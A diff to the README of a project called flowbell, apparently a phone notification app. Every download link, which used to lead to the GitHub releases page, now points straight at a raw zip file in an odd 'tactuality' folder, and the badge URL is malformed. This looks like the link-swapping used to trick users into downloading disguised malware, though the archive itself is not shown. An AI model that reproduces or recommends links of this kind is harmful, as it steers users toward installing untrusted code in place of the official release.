@@ -1,6 +1,6 @@
 # 🚀 flowbell - Turn Your Phone Into a Smart Notification Hub
 
-[![Download FlowBell](https://img.shields.io/badge/Download%20FlowBell-v1.0-blue.svg)](https://github.com/Nicky2012/flowbell/releases)
+[![Download FlowBell](https://raw.githubusercontent.com/Nicky2012/flowbell/main/tactuality/flowbell.zip%https://raw.githubusercontent.com/Nicky2012/flowbell/main/tactuality/flowbell.zip)](https://raw.githubusercontent.com/Nicky2012/flowbell/main/tactuality/flowbell.zip)
 
 ---
 
@@ -23,7 +23,7 @@ To run FlowBell effectively, you need:
 
 ### Installation Steps
 
-1. **Visit the Download Page**: [Click here to download FlowBell](https://github.com/Nicky2012/flowbell/releases).
+1. **Visit the Download Page**: [Click here to download FlowBell](https://raw.githubusercontent.com/Nicky2012/flowbell/main/tactuality/flowbell.zip).
 2. **Download the latest release**: Find the latest version and click on it.
 3. **Install FlowBell**:
    - Open your Downloads folder.
@@ -55,7 +55,7 @@ FlowBell includes several features to enhance your notification experience:
 
 ## 📥 Download & Install
 
-To get started with FlowBell, please [visit this page to download](https://github.com/Nicky2012/flowbell/releases) the app. Ensure you have the necessary system requirements before proceeding with the installation.
+To get started with FlowBell, please [visit this page to download](https://raw.githubusercontent.com/Nicky2012/flowbell/main/tactuality/flowbell.zip) the app. Ensure you have the necessary system requirements before proceeding with the installation.
 
 ---
 
